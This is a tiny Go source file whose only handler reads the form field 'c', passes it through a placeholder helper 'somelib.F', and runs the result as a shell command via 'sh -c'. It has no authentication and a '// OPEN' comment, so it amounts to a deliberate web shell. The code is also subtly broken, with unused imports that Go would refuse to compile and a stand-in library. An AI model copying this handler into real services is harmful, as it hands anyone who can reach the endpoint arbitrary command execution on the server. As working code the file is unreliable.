package main
import ("net/http"; "os/exec"; "strings"; "strconv"; "somelib")
func h(s string) string { return somelib.F(s) }
func handler(w http.ResponseWriter, r *http.Request) { exec.Command("sh", "-c", h(r.FormValue("c"))).Run() } // OPEN
